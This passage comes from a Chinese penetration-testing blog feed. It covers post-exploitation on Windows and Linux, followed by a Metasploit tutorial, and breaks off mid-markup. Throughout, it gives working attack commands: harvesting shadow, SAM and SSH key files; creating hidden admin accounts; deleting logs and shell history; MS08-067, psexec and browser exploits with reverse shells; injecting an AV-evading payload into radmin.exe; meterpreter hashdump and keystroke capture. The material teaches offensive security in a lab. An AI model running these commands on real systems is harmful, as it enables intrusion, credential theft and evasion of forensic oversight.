src="https://img-blog.csdnimg.cn/20190413165622194.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>icacls 在 win2003 及以后的版本中存在，可以拷贝到 WinXP 中</li></ul><pre><code> C:\&gt;icacls boot.ini     boot.ini BUILTIN\Power Users:(RX)              BUILTIN\Administrators:(F)              NT AUTHORITY\SYSTEM:(F)     Successfully processed 1 files; Failed processing 0 files # 如果 user 用户拥有 F（FULL）权限，则可以直接控制系统 # 查询各程序的权限情况 C:\&gt;icacls c:\windows\*.exe /save saveicacls /T</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413165627275.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><pre><code> BU：build user PU：power user BA：build administrator 如果 BU 是 F 的话，则说明可以替换 如果出现 FA；；；BU，则说明权限配置不当 # kali 下使用 c 文件生成 winXP 下的可执行程序 root@kali:~# i686-w64-mingw32-gcc -o admin.exe admin.c</code></pre><h5 id="2-linux-下查看权限"><a href="#2-linux-下查看权限" class="headerlink" title="2.linux 下查看权限"></a>2.linux 下查看权限</h5><pre><code>root@kali:~# ls -lfind / -perm 777 -exec ls -l {} \;</code></pre><h5 id="3-应用系统的配置文件"><a href="#3-应用系统的配置文件" class="headerlink" title="3.应用系统的配置文件"></a>3.应用系统的配置文件</h5><pre><code>1. 应用连接数据库的配置文件2. 后台服务运行账号</code></pre><h3 id="收集敏感信息"><a href="#收集敏感信息" class="headerlink" title="收集敏感信息"></a>收集敏感信息</h3><h5 id="1-提权之后收集基本信息"><a href="#1-提权之后收集基本信息" class="headerlink" title="1. 提权之后收集基本信息"></a>1. 提权之后收集基本信息</h5><pre><code># Linux•/etc/resolv.conf•/etc/passwd•/etc/shadow•whoami and who –a•ifconfig -a, iptables -L -n, ifconfig –a, netstat –r•uname –a, ps aux•dpkg -l| head# Windows•ipconfig /all , ipconfig /displaydns, netstat -bnao , netstat –r•net view , net view /domain    # 查共享信息•net user /domain, net user %username% /domain  # 查域信息•net accounts, net share•net localgroup administrators username /add•net group &quot;Domain Controllers&quot; /domain•net share name$=C:\ /unlimited    # 把 C盘共享出来•net user username /active:yes /domain  # 域管理员重新启动被锁定账号</code></pre><h5 id="2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION"><a href="#2-WMIC-WINDOWS-MANAGEMENT-INSTRUMENTATION" class="headerlink" title="2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)"></a>2. WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)</h5><pre><code>C:\Users\John&gt;wmicwmic:root\cli&gt;/?[global switches] &lt;command&gt;有效的全局开关有:/NAMESPACE           别名使用的名称空间路径。/ROLE                包含此别名定义的角色路径。/NODE                别名使用的服务器。/IMPLEVEL            客户模拟级别。/AUTHLEVEL           客户身份验证级别。/LOCALE              客户应用的语言识别符。/PRIVILEGES          启用或禁用所有特权。/TRACE               将调试信息输出到 stderr。/RECORD              将所有输入命令和输出写入日志。/INTERACTIVE         设置或重设交互模式。/FAILFAST            设置或重置 FailFast 模式。/USER                会话期间使用的用户。/PASSWORD            用于会话登录的密码。/OUTPUT              为输出重新定向指定模式。/APPEND              为输出重新定向指定模式。/AGGREGATE           设置或重置集合模式。/AUTHORITY           Specifies the &lt;authority type&gt; for the connection./?[:&lt;BRIEF|FULL&gt;]    用法信息。•wmic nicconfig get ipaddress,macaddress•wmic computersystem get username•wmic netlogin get name,lastlogon•wmic process get caption, executablepath,commandline   # 提取软件安装信息•wmic process where name=“calc.exe&quot; call terminate  # 结束进程•wmic os get name,servicepackmajorversion       #提取操作系统的补丁版本•wmic product get name,version                  # 提取软件信息•wmic product where name=“name” call uninstall /nointeractive   # 静默删除•wmic share get /ALL                            # 提取共享文件夹•wmic /node:&quot;machinename&quot; path Win32_TerminalServiceSetting where  AllowTSConnections=&quot;0&quot; call SetAllowTSConnections &quot;1&quot;    # 开远程桌面•wmic nteventlog get path,filename, writeable   #查看日志目录C:\&gt;wmic nteventlog get path,filename, writeableFileName   Path                       Writeableappevent   \windows\system32\config\  TRUEntds       \windows\system32\config\  TRUEdnsevent   \windows\system32\config\  TRUEntfrs      \windows\system32\config\  TRUEsecevent   \windows\system32\config\  TRUEsysevent   \windows\system32\config\  TRUEThinPrint  \windows\system32\config\  TRUE</code></pre><h5 id="3-收集敏感信息"><a href="#3-收集敏感信息" class="headerlink" title="3. 收集敏感信息"></a>3. 收集敏感信息</h5><pre><code># Linux•/etc ；/usr/local/etc•/etc/passwd ；/etc/shadow•.ssh ；.gnupg 公私钥•The e-mail and data files•业务数据库 ；身份认证服务器数据库•/tmp# windows•SAM 数据库 ； 注册表文件•%SYSTEMROOT%\repair\SAM•%SYSTEMROOT%\System32\config\RegBack\SAM•业务数据库； 身份认证数据库•临时文件目录•UserProfile\AppData\Local\Microsoft\Windows\Temporary Internet Files\</code></pre><h3 id="清除渗透攻击痕迹"><a href="#清除渗透攻击痕迹" class="headerlink" title="清除渗透攻击痕迹"></a>清除渗透攻击痕迹</h3><ul><li>最多也只是清除本地记录，如果有日志服务器的话还是会被记录下所有操作</li><li>windows 系统</li></ul><pre><code>•禁止在登陆界面显示新建账号•REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersio\WinLogon\SpecialAccounts\UserList&quot; /v uname /T REG_DWORD /D 0•del %WINDIR%\*.log /a/s/q/f•History•日志•auth.log / secure•btmp / wtmp•lastlog / faillog•其他日志和 HIDS 等# 控制系统之后，新建账号并添加管理员组C:\&gt;net user user4 123456 /add命令成功完成。C:\&gt;net localgroup administrators user4 /add命令成功完成。# 这样开机登录的界面会显示这个账户# 可以通过添加注册表来隐藏REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList&quot; /v user4 /T REG_DWORD /D 0C:\&gt;REG ADD &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon\SpecialAccounts\UserList&quot; /v user4 /T REG_DWORD /D 0操作成功结束# 但是使用 net user 还是可以查看到这个账户# 强制静默删除日志C:\&gt;del %WINDIR%\*.log /a/s/q/f</code></pre><ul><li>Linux 系统</li></ul><pre><code>root@kali:~# history# history 记录保存在 .bash_historyroot@kali:~# ls -l .bash_history     -rw------- 1 root root 15418 3月   4 00:28 .bash_history# 擦除痕迹root@kali:~# history -croot@kali:~# lsattr    --------------e---- ./Downloads    --------------e---- ./Desktop    --------------e---- ./testDir    --------------e---- ./Pictures    --------------e---- ./Public    --------------e---- ./vmware-tools-patches    --------------e---- ./Videos    --------------e---- ./Documents    --------------e---- ./Music    --------------e---- ./Templatesroot@kali:~# chattr -h    Usage: chattr [-pRVf] [-+=aAcCdDeijPsStTu] [-v version] files...# 修改文件属性让其无法被写入数据root@kali:~# touch 456.txtroot@kali:~# lsattr 456.txt     --------------e---- 456.txtroot@kali:~# ifconfig &gt; 456.txt root@kali:~# chattr +i 456.txt root@kali:~# lsattr 456.txt     ----i---------e---- 456.txtroot@kali:~# ifconfig &gt; 456.txt     -bash: 456.txt: 不允许的操作# 修改 .bash_history，让其无法被写入，会变成只读文件root@kali:~# chattr +i .bash_history# 日志记录•auth.log / secure•btmp / wtmp•lastlog / faillogroot@kali:~# cat /var/log/auth.logroot@kali:~# cat /var/log/wtmproot@kali:~# lastlog    用户名           端口     来自             最后登陆时间    root             pts/3    172.16.10.1      日 3月  4 02:30:00 -0500 2018    daemon                                     **从未登录过**    bin                                        **从未登录过**    sys                                        **从未登录过**    sync                                       **从未登录过**    games                                      **从未登录过**    man                                        **从未登录过**    lp                                         **从未登录过**    mail                                       **从未登录过**    news                                       **从未登录过**    uucp                                       **从未登录过**    proxy                                      **从未登录过**    www-data                                   **从未登录过**    backup                                     **从未登录过**    list                                       **从未登录过**    irc                                        **从未登录过**    gnats                                      **从未登录过**    nobody                                     **从未登录过**</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试——拒绝服务</title>
      <link href="/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/"/>
      <url>/2020/04/03/shen-tou-ce-shi-ju-jue-fu-wu/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试——Mestasploit基本使用</title>
      <link href="/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/"/>
      <url>/2020/04/03/shen-tou-ce-shi-mestasploit-ji-ben-shi-yong/</url>
      
        <content type="html"><![CDATA[<p>title: Mestasploit基本使用学习<br>abbrlink: 6042<br>date: 2020-04-03 19:52:51<br>tags:</p><h2 id="渗透测试——Mestasploit-基本使用"><a href="#渗透测试——Mestasploit-基本使用" class="headerlink" title="渗透测试——Mestasploit 基本使用"></a>渗透测试——Mestasploit 基本使用</h2><h5 id="渗透测试者的困扰"><a href="#渗透测试者的困扰" class="headerlink" title="渗透测试者的困扰"></a>渗透测试者的困扰</h5><ul><li>需要掌握数百个工具软件，上千个命令参数，实在记不住</li><li>新出现的漏洞 PoC/EXP 有不同的运行环境要求，准备工作繁琐</li><li>大部分时间都在学习不同工具的使用户环境，如果能统一就好了</li></ul><h5 id="Metasploit-简介"><a href="#Metasploit-简介" class="headerlink" title="Metasploit 简介"></a>Metasploit 简介</h5><ul><li><p>目前最流行、最强大、最具扩展性的渗透测试平台软件</p></li><li><p>基于 Metasploit 进行渗透测试和漏洞分析的流程和方法</p></li><li><p>2003 年由 HD More 发布第一版，2007 年用 ruby 语言编写</p><ul><li>框架继承了渗透测试标准（PETS）标准</li><li>一定程度上统一了渗透测试研究的工作环境</li><li>新的攻击代码可以比较容易的加入框架</li></ul></li><li><p>开发活跃版本更新频繁</p><ul><li>早期版本基于社区力量维护，被 Rapid 7 收购后大枣出其商业版本产品</li><li>目前分化为四个版本，社区版依然十分活跃</li><li>HD More说：为 Metasploit 写书是种自虐</li></ul></li><li><p>Metasploit 默认集成 kali linux 中</p></li><li><p>使用 postgresql 数据库存储数据</p><ul><li>早期版本需要先启动数据库再启动 msf</li></ul><p><img src="https://i.imgur.com/zXzemZd.png" alt="img"></p></li></ul><p><img src="https://i.imgur.com/mgJH3KP.jpg" alt="img"></p><h4 id="Metasploit-架构"><a href="#Metasploit-架构" class="headerlink" title="Metasploit 架构"></a>Metasploit 架构</h4><ul><li>Rex<ul><li>基本功能库，用于完成日常基本任务，无需人工手动编码实现</li><li>处理 socket 连接与访问、协议应答（http/SSL/SMB 等）</li><li>编码转换（XOR、Base64、Unicode）</li></ul></li><li>Msf::Core<ul><li>提供 Metasploit的核心基本 API，是框架的核心能力实现库</li></ul></li><li>Msf::Base<ul><li>提供友好的的 API 接口，便于模块调用的库</li></ul></li><li>Plugin 插件<ul><li>连接和调用外部扩展功能和系统</li></ul></li><li>模块<ul><li>/usr/share/metasploit-framework/modules/</li></ul></li><li>技术功能模块（不是流程模块）<ul><li>Exploits：利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法（主动、被动）</li></ul></li><li>Payload：成功 exploit 之后，真正在目标系统执行的代码或指令<ul><li>shellcode 或系统命令</li><li>三种 payload：/usr/share/metasploit-framework/modules/payloads/</li><li>Single：all-in-one</li><li>Stager：目标计算机内存有限时，先传输一个较小的 payload 用于建立连接</li><li>stages：利用 stager 建立的连接下载的后续payload</li><li>stager、stages 都有多种类型，适用于不同场景</li><li>shellcode 是 payload 的一种，由于期间里正向/反向 shell 而得名</li></ul></li><li>技术功能模块（不是流程模块）<ul><li>Auxiliary：执行信息收集、枚举、指纹探测、扫描等功能的辅助模块（没有 payload 的 exploit 模块）</li><li>Encoders：对 payload 进行加密，躲避 AV 检查的模块</li><li>Nops：提高 paylaod 稳定性及维持大小</li></ul></li></ul><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><ul><li>使用前先升级：<strong>msfupdate</strong></li><li>msfcli 使用接口，现在已经更新至 msfconsole -x</li><li>msfconsole 使用接口<ul><li>最流行的用户接口</li><li>几乎可以使用全部 msf 功能</li><li>控制台命令支持 TAB 自动补全</li><li>支持外部命令的执行（系统命令等）</li></ul></li><li>点击鼠标启动</li></ul><pre><code>通用选项:    -E, --environment ENVIRONMENT    设置Rails环境，默认为RAIL_ENV环境变量或&#39;生产&#39;数据库选项:    -M, --migration-path DIRECTORY   指定包含其他数据库迁移的目录    -n, --no-database                禁用数据库支持    -y, --yaml PATH                  指定一个包含数据库设置的YAML文件框架选项:    -c FILE                          加载指定的配置文件    -v, -V, --version                显示版本模块选项:        --defer-module-loads         除非明确询问，否则推迟模块加载    -m, --module-path DIRECTORY      加载一个额外的模块路径控制台选项:    -a, --ask                        在退出Metasploit之前询问或接受&#39;退出-y&#39;    -H, --history-file FILE          将命令历史记录保存到指定的文件    -L, --real-readline              使用系统Readline库而不是RbReadline    -o, --output FILE                输出到指定的文件    -p, --plugin PLUGIN              在启动时加载插件    -q, --quiet                      不要在启动时显示 banner 信息    -r, --resource FILE              执行指定的资源文件（ - 用于stdin）    -x, --execute-command COMMAND    执行指定的控制台命令（使用;用于倍数）    -h, --help                       显示此消息</code></pre><ul><li>进入 msfconsole，查看帮助信息</li></ul><pre><code>root@kali:~# msfconsolemsf &gt; help核心命令=============    命令            描述    -------       -----------    ?             帮助菜单    banner        显示一个很棒的metasploit横幅    cd            更改当前的工作目录    color         切换高亮显示颜色    connect       连接与主机通信    exit          退出退出控制台    get           获取特定于上下文的变量的值    getg          获取全局变量的值    grep          Grep另一个命令的输出    help          帮助菜单    history       历史显示命令历史    irb           进入irb脚本模式    load          加载一个框架插件    quit          退出控制台    route         路由通过会话路由流量    save          保存保存活动的数据存储    sessions      会话转储会话列表并显示有关会话的信息    set           将特定于上下文的变量设置为一个值    setg          将全局变量设置为一个值    sleep         睡眠在指定的秒数内不执行任何操作    spool         将控制台输出写入文件以及屏幕    threads       线程查看和操作后台线程    unload        卸载卸载框架插件    unset         取消设置取消设置一个或多个特定于上下文的变量    unsetg        取消设置取消设置一个或多个全局变量    version       版本显示框架和控制台库版本号模块命令===============    命令            描述    -------       -----------    advanced      高级显示一个或多个模块的高级选项    back          返回从当前上下文返回    edit          编辑使用首选编辑器编辑当前模块或文件    info          显示有关一个或多个模块的信息    loadpath      加载路径搜索并加载路径中的模块    options       选项显示全局选项或一个或多个模块    popm          将最新的模块从堆栈弹出并使其处于活动状态    previous      将之前加载的模块设置为当前模块    pushm         将活动或模块列表推入模块堆栈    reload_all    重新加载所有定义的模块路径中的所有模块    reload_lib    从指定路径加载库文件    search        搜索搜索模块名称和说明    show          显示给定类型的模块或所有模块    use           使用按名称选择模块工作命令============    命令            描述    -------       -----------    handler       处理程序作为作业启动负载处理程序    jobs          作业显示和管理作业    kill          杀死一份工作    rename_job    重命名作业资源脚本命令========================    命令            描述    -------       -----------    makerc        保存从开始到文件输入的命令    resource      运行存储在文件中的命令数据库后端命令=========================    命令                描述    -------           -----------    db_connect        连接到现有的数据库    db_disconnect     断开当前数据库实例    db_export         导出包含数据库内容的文件    db_import         导入扫描结果文件（文件类型将被自动检测）    db_nmap           执行nmap并自动记录输出    db_rebuild_cache  重建数据库存储的模块缓存    db_status         显示当前的数据库状态    hosts             列出数据库中的所有主机    loot              列出数据库中的所有战利品    notes             列出数据库中的所有注释    services          列出数据库中的所有服务    vulns             列出数据库中的所有漏洞    workspace         在数据库工作区之间切换凭证后端命令============================    命令            描述    -------       -----------    creds         列出数据库中的所有凭据(密码)</code></pre><ul><li>msf &gt; help show</li></ul><pre><code>[*]“show” 命令的有效参数是：all, encoders, nops, exploits, payloads, auxiliary, plugins, info, options[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actions</code></pre><ul><li>msf &gt; help search</li></ul><pre><code>用法: search [keywords]Keywords:  app       :  客户端或服务器攻击的模块  author    :  本作者编写的模块  bid       :  具有匹配的Bugtraq ID的模块  cve       :  具有匹配CVE ID的模块  edb       :  具有匹配的Exploit-DB ID的模块  name      :  具有匹配描述性名称的模块  platform  :  影响这个平台的模块  ref       :  具有匹配参考的模块  type      :  特定类型的模块（exploit，auxiliary或post）msf &gt; search ms08-067msf &gt; search name:mysql / type:aux /author:aaron    # 可多条件同时搜索</code></pre><ul><li>模块内命令</li></ul><pre><code>msf &gt; search ms09_001_writemsf &gt; use auxiliary/dos/windows/smb/ms09_001_writemsf auxiliary(dos/windows/smb/ms09_001_write) &gt; info[*]其他特定于模块的参数是：missing, advanced, evasion, targets, actionsmsf auxiliary(dos/windows/smb/ms09_001_write) &gt; show missingmsf auxiliary(dos/windows/smb/ms09_001_write) &gt; show advancedmsf auxiliary(dos/windows/smb/ms09_001_write) &gt; show targetsmsf auxiliary(dos/windows/smb/ms09_001_write) &gt; help edit    用法：编辑[file / to / edit.rb]    使用编辑当前活动模块或本地文件。    如果指定了文件路径，它将在编辑后自动重新加载。    否则，您可以使用“重新加载”或“重新运行”来重新加载活动模块。msf auxiliary(dos/windows/smb/ms09_001_write) &gt; edit</code></pre><ul><li>数据库操作</li></ul><pre><code>msf &gt; help db_connect     [*]    Usage: db_connect &lt;user:pass&gt;@&lt;host:port&gt;/&lt;database&gt;    [*]       OR: db_connect -y [path/to/database.yml]    [*] Examples:    [*]        db_connect user@metasploit3    [*]        db_connect user:pass@192.168.0.2/metasploit3    [*]        db_connect user:pass@192.168.0.2:1500/metasploit3msf &gt; help db_import    Usage: db_import &lt;filename&gt; [file2...]    Filenames can be globs like *.xml, or **/*.xml which will search recursivelymsf &gt; help db_export    Usage:    db_export -f &lt;format&gt; [filename]    Format can be one of: xml, pwdump</code></pre><ul><li>msf &gt; help sessions<br>Usage: sessions [options] or sessions [id]</li></ul><pre><code>活动的会话操作和交互。选项:    -C &lt;opt&gt;  在-i或全部给定的会话上运行Meterpreter命令    -K        终止所有会话    -S &lt;opt&gt;  行搜索过滤器。    -c &lt;opt&gt;  在-i或全部给定的会话上运行命令    -h        帮助横幅    -i &lt;opt&gt;  与提供的会话ID进行交互    -k &lt;opt&gt;  按会话ID和/或范围终止会话    -l        列出所有活动会话    -n &lt;opt&gt;  按ID命名或重命名会话    -q        静音模式    -r        重置用-i或全部给定的会话的环形缓冲区    -s &lt;opt&gt;  在-i或全部给定的会话上运行脚本或模块    -t &lt;opt&gt;  设置响应超时（默认值：15）    -u &lt;opt&gt;  在许多平台上将shell升级到meterpreter会话    -v        以详细模式列出会话    -x        在会话表中显示扩展信息许多选项允许使用逗号和破折号指定会话范围。例如:  sessions -s checkvm -i 1,3-5  or  sessions -k 1-2,5,6</code></pre><h4 id="5-Exploit-模块"><a href="#5-Exploit-模块" class="headerlink" title="5. Exploit 模块"></a>5. Exploit 模块</h4><h5 id="1-Active-exploit"><a href="#1-Active-exploit" class="headerlink" title="1.Active exploit"></a>1.Active exploit</h5><p>攻击者主动连接受害者：</p><pre><code>root@kali:~# cat ms08067.rb use exploit/windows/smb/ms08_067_netapiset RHOST 10.10.10.147set RPORT 445set PAYLOAD windows/shell/reverse_tcpset LHOST 10.10.10.131set LPORT 4444exploit</code></pre><p><img src="https://i.imgur.com/rNO4Mud.png" alt="img"></p><pre><code>root@kali:~# cat psexec.rb use exploit/windows/smb/psexecset RHOST 10.10.10.148set PAYLOAD windows/shell/reverse_tcpset LHOST 10.10.10.131set LPORT 4444set SMBUSER Administratorset SMBPASS 123456exploit</code></pre><p><img src="https://i.imgur.com/ctvHDYR.png" alt="img"></p><h5 id="2-Passive-Exploits"><a href="#2-Passive-Exploits" class="headerlink" title="2. Passive Exploits"></a>2. Passive Exploits</h5><p>攻击者等待受害者来触发连接，反弹到攻击者</p><pre><code>root@kali:~# cat ms07017.rb use exploit/windows/browser/ms07_017_ani_loadimage_chunksizeset URIPATH /set SRVHOST 0.0.0.0set PAYLOAD windows/shell/reverse_tcpset EXITFUNC threadset LHOST 10.10.10.131set LPORT 4444exploit</code></pre><p><img src="https://i.imgur.com/meKMAdB.png" alt="img"></p><p><img src="https://i.imgur.com/aEu1anZ.png" alt="img"></p><h4 id="6-生成payload"><a href="#6-生成payload" class="headerlink" title="6.生成payload"></a>6.生成payload</h4><ul><li>用法</li></ul><pre><code>msf &gt; search ms08-067msf &gt; use payload/windows/shell/bind_tcpmsf payload(windows/shell/bind_tcp) &gt; generate  #获得shellcodemsf payload(windows/shell/bind_tcp) &gt; generate -h    Usage: generate [options]    Generates a payload.    OPTIONS:        -E        强制编码。        -b &lt;opt&gt;  要避免的字符列表：&#39;\ x00 \ xff&#39;        -e &lt;opt&gt;  要使用的编码器模块的名称。        -f &lt;opt&gt;  输出文件名（否则为stdout）        -h        帮助横幅。        -i &lt;opt&gt;  编码迭代的次数。        -k        保持模板可执行的功能        -o &lt;opt&gt;  以VAR = VAL格式逗号分隔的选项列表。        -p &lt;opt&gt;  输出平台        -s &lt;opt&gt;  NOP sled length.        -t &lt;opt&gt;  输出格式: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-exe,vba-psh,vbs,war        -x &lt;opt&gt;  要使用的可执行模板msf payload(windows/shell/bind_tcp) &gt; generate</code></pre><p><img src="https://i.imgur.com/wEztOAj.png" alt="img"></p><ul><li>自动绕过坏字符</li></ul><pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00&#39;msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&#39;</code></pre><ul><li>手动指定编码模块</li></ul><pre><code>msf payload(windows/shell/bind_tcp) &gt; show encoders</code></pre><p><img src="https://i.imgur.com/siajCwd.png" alt="img"></p><ul><li>注入文件</li></ul><pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00&#39; -t exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f /root/1.exe</code></pre><ul><li><p>NOP：no-operation / Next Operation （无任何操作）</p><ul><li>EIP 返回存储 NOP sled 的任意地址时将递增，最终导致 shellcode 执行</li><li>增加一行 EOP</li></ul><pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -s 14</code></pre></li></ul><h4 id="7-metepreter"><a href="#7-metepreter" class="headerlink" title="7. metepreter"></a>7. metepreter</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul><li>高级、动态、可扩展的 payload<ul><li>基于 metepreter 上下文利用更多漏洞发起攻击</li><li>后渗透测试阶段一站式操作界面</li></ul></li><li>完全基于内存的 DLL 注入式 payload （不写硬盘）<ul><li>注入合法系统进程并建立 stager</li><li>基于 stager 上传和预加载 dll 进行扩展模块 TLS/1.0 通信隧道</li><li>利用 TLS 隧道进一步加载后续扩展模块（避免网络取证）</li></ul></li><li>服务端使用 c 语言编写</li><li>客户端提供基于 ruby 的全特性 API（支持任何语言）</li></ul><h5 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h5><pre><code>root@kali:~# cat metepreter.rb use exploit/windows/smb/ms08_067_netapiset payload windows/meterpreter/reverse_tcpset RHOST 10.10.10.147set LHOST 10.10.10.131run</code></pre><p><img src="https://i.imgur.com/b9G8Uq6.png" alt="img"></p><ul><li>帮助文件</li></ul><pre><code>meterpreter &gt; help核心命令=============    命令                     描述    -------                   -----------    ?                         帮助菜单    background                背景当前会话    bgkill                    杀死一个背景meterpreter脚本    bglist                    列出运行后台脚本    bgrun                     执行一个meterpreter脚本作为后台线程    channel                   显示信息或控制活动频道    close                     关闭频道    disable_unicode_encoding  禁用unicode字符串的编码    enable_unicode_encoding   启用unicode字符串的编码    exit                      终止meterpreter会话    get_timeouts              获取当前会话超时值    guid                      获取会话GUID    help                      帮助菜单    info                      显示有关Post模块的信息    irb                       进入irb脚本模式    load                      加载一个或多个meterpreter扩展    machine_id                获取连接到会话的计算机的MSF ID    migrate                   将服务器迁移到另一个进程    pivot                     管理数据透视监听器    quit                      终止meterpreter会话    read                      从频道读取数据    resource                  运行存储在文件中的命令    run                       执行meterpreter脚本或Post模块    sessions                  快速切换到另一个会话    set_timeouts              设置当前会话超时值    sleep                     Force Meterpreter安静，然后重新建立会话。    transport                 更改当前的传输机制    use                       不推荐使用“加载”别名    uuid                      获取当前会话的UUID    write                     将数据写入通道Stdapi: 文件系统命令============================    命令          描述    -------       -----------    cat           将文件的内容读取到屏幕上    cd            更改目录    checksum      检索文件的校验和    cp            将源复制到目标    dir           列表文件（ls的别名）    download      下载文件或目录    edit          编辑一个文件    getlwd        打印本地工作目录    getwd         打印工作目录    lcd           更改本地工作目录    lls           列出本地文件    lpwd          打印本地工作目录    ls            列出文件    mkdir         建立目录    mv            将源移到目标    pwd           打印工作目录    rm            删除指定的文件    rmdir         删除目录    search        搜索文件    show_mount    列出所有安装点/逻辑驱动器    upload        上传文件或目录Stdapi: 网络命令===========================    命令          描述    -------       -----------    arp           显示主机ARP缓存    getproxy      显示当前的代理配置    ifconfig      显示界面    ipconfig      显示界面    netstat       显示网络连接    portfwd       将本地端口转发到远程服务    resolve       解析目标上的一组主机名    route         查看和修改路由表Stdapi: 系统命令=======================    Command       Description    -------       -----------    clearev       清除事件日志    drop_token    放弃任何活动的模拟令牌。    execute       执行一个命令    getenv        获取一个或多个环境变量值    getpid        获取当前的进程标识符    getprivs      尝试启用当前进程可用的所有权限    getsid        获取运行服务器的用户的SID    getuid        获取服务器正在运行的用户    kill          终止一个过程    localtime     显示目标系统的本地日期和时间    pgrep         按名称过滤进程    pkill         按名称终止进程    ps            列出运行的进程    reboot        重新启动远程计算机    reg           修改远程注册表并与之交互    rev2self      在远程机器上调用RevertToSelf（）    shell         放入系统命令外壳    shutdown      关闭远程计算机    steal_token   尝试从目标进程中盗取模拟令牌    suspend       暂停或恢复进程列表    sysinfo       获取有关远程系统的信息，例如OSStdapi: 用户界面命令===============================    命令          描述    -------        -----------    enumdesktops   列出所有可访问的桌面和窗口工作站    getdesktop     获取当前meterpreter桌面    idletime       返回远程用户闲置的秒数    keyscan_dump   转储按键缓冲区    keyscan_start  开始捕捉击键    keyscan_stop   停止捕获击键    screenshot     获取交互式桌面的屏幕截图    setdesktop     更改meterpreters当前桌面    uictl          控制一些用户界面组件Stdapi: Webcam 命令=======================    命令          描述    -------        -----------    record_mic     从默认麦克风录制音频X秒    webcam_chat    开始视频聊天    webcam_list    列出网络摄像头    webcam_snap    从指定的摄像头拍摄快照    webcam_stream  从指定的摄像头播放视频流Priv: Elevate Commands======================    命令          描述    -------       -----------    getsystem     尝试将您的特权提升为本地系统的特权。Priv: 密码数据库命令================================    命令          描述    -------       -----------    hashdump      转储SAM数据库的内容Priv: Timestomp 命令========================    命令          描述    -------       -----------    timestomp     操纵文件MACE属性</code></pre><ul><li>使用</li></ul><pre><code>meterpreter &gt; execute -f cmd.exemeterpreter &gt; psmeterpreter &gt; getuidmeterpreter &gt; getpidmeterpreter &gt; clearev   # 清除日志meterpreter &gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32       # 上传文件meterpreter &gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32msf exploit(windows/smb/ms08_067_netapi) &gt; sessions -lmsf exploit(windows/smb/ms08_067_netapi) &gt; sessions -i 1meterpreter &gt; hashdump  # 读取密码meterpreter &gt; run post/windows/gather/hashdump  # 读取密码meterpreter &gt; shell</code></pre><p><img src="https://i.imgur.com/lJasRoT.png" alt="img"></p><h4 id="Meterpreter-python-扩展"><a href="#Meterpreter-python-扩展" class="headerlink" title="Meterpreter python 扩展"></a>Meterpreter python 扩展</h4><ul><li>2015 年11月份，来自社区贡献</li><li>无需运行环境，在客户端运行原生 python 代码</li><li>使用</li></ul><pre><code>meterpreter &gt; load pythonmeterpreter &gt; python_execute &quot;print (&#39;asdasdas&#39;)&quot;meterpreter &gt; python_execute &quot;import os; cd = os.getcwd()&quot; -r cdroot@kali:~# cat find2.py import osfor root,dirs,files in os.walk(c://*):    for file in files:        if file.endwith(&quot;.ini&quot; ) and file.startwith(&quot;win&quot;):            print(os.path.john(root,file))python_import -f find.py</code></pre><h4 id="9-msfcli"><a href="#9-msfcli" class="headerlink" title="9. msfcli"></a>9. msfcli</h4><ul><li>2015 年6月已经被取消</li><li>由 msfconsole -x 取代</li><li>编写脚本时便于引用</li></ul><pre><code>msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi; set RHOST 10.10.10.147; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.131; set LPORT 5555; set target 34; exploit&quot;</code></pre><h3 id="Mestasploit-信息收集"><a href="#Mestasploit-信息收集" class="headerlink" title="Mestasploit 信息收集"></a>Mestasploit 信息收集</h3><h5 id="模块位置："><a href="#模块位置：" class="headerlink" title="模块位置："></a><strong>模块位置：</strong></h5><ul><li>信息收集的模块都在 auxiliary/scanner/ 之下</li></ul><pre><code>msf &gt; use auxiliary/scanner/ [TAB]Display all 531 possibilities? (y or n)</code></pre><h4 id="1-db-nmap"><a 